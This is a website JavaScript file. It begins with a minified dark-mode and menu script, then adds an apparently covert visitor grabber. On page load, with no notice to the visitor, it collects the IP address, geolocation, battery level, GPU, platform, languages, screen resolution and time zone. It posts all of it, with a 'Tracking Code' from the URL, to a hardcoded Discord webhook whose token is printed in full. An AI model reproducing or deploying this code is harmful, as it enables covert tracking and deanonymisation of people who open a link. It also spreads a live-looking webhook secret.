document.addEventListener("DOMContentLoaded",()=>{function e(e){let t=document.body,s=document.querySelector(".logo");"dark"===e?(t.classList.remove("light-mode"),t.classList.add("dark-mode"),s.src="assets/logoo.png"):(t.classList.remove("dark-mode"),t.classList.add("light-mode"),s.src="assets/logop.png")}function t(){window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?e("dark"):e("light")}t(),window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",t=>{e(t.matches?"dark":"light")});let s=document.querySelector(".toggle"),o=document.querySelector(".menu");document.querySelectorAll(".menu a");let c=document.querySelector(".menu-icon");function l(e){let t=document.querySelector(e);if(t){let s=t.getBoundingClientRect().top,o=s+window.pageYOffset-80;window.scrollTo({top:o,behavior:"smooth"})}}function a(){o?.classList.toggle("active"),s?.classList.toggle("active"),document.body.classList.toggle("menu-open");let e=o?.classList.contains("active");c.src=e?"assets/close.png":"assets/menu.png"}s?.addEventListener("click",a),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",t=>{t.preventDefault(),e.closest(".menu")&&a(),l(e.getAttribute("href"))})})});
        fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        const ipAddress = data.ip;
        fetchGeolocationData(ipAddress);
    })
    .catch(error => {
        console.error('Error fetching IP address:', error);
    });

function fetchGeolocationData(ipAddress) {
    fetch(`https://freeipapi.com/api/json/${ipAddress}`)
        .then(response => response.json())
        .then(data => {
            const geoLocationData = JSON.stringify(data, null, 2);
            getBatteryLevel().then(batteryLevel => {
                const deviceInfo = getDeviceInfo();

                const embed = {
                    title: 'Success!',
                    description: `Tracking Code: ${getParameterByName('code')}`,
                    fields: [
                        { name: 'IP Address', value: ipAddress },
                        { name: 'Geolocation', value: `\`\`\`json\n${geoLocationData}\n\`\`\`` },
                        { name: 'Battery Level', value: batteryLevel },
                        { name: 'Device', value: navigator.userAgent },
                        { name: 'Graphics Card', value: deviceInfo.gpu },
                        { name: 'Platform', value: navigator.platform },
                        { name: 'Languages', value: navigator.languages.join(', ') },
                        { name: 'Screen Resolution', value: `${window.screen.width}x${window.screen.height}` },
                        { name: 'Time Zone', value: Intl.DateTimeFormat().resolvedOptions().timeZone },
                        { name: 'User Agent', value: navigator.userAgent }
                    ],
                    footer: {
                        text: 'powered by linux.scot'
                    }
                };

                const payload = JSON.stringify({ embeds: [embed] });
                console.log('Payload being sent:', payload);

                // CHANGE THE CONTENT IN webhookUrl OTHERWISE YOU WONT GET THE DATA
                const webhookUrl = 'https://discord.com/api/webhooks/1341886964420579339/lypXPPLfFFuCClDtsJEvmGV-7chwgB8cRp99EycU1FfjE14oPeJRaEib6GlCuWBD6WRh';
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: payload
                })
                    .then(response => {
                        if (response.ok) {
                            console.log('Embed sent successfully');
                        } else {
                            console.error('Failed to send embed', response.statusText);
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                    });
            });
        })
        .catch(error => {
            console.error('Error fetching geolocation data:', error);
        });
}

// Function to get URL parameters
function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, '\\$&');
    const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
}

// Function to get battery level
function getBatteryLevel() {
    if (navigator.getBattery) {
        return navigator.getBattery().then(battery => {
            return (battery.level * 100).toFixed(2) + '%';
        });
    }
    return Promise.resolve('N/A');
}

// Function to get device information including GPU
function getDeviceInfo() {
    let canvas = document.createElement('canvas');
    let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    let debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
    let gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';

    return { gpu };
}
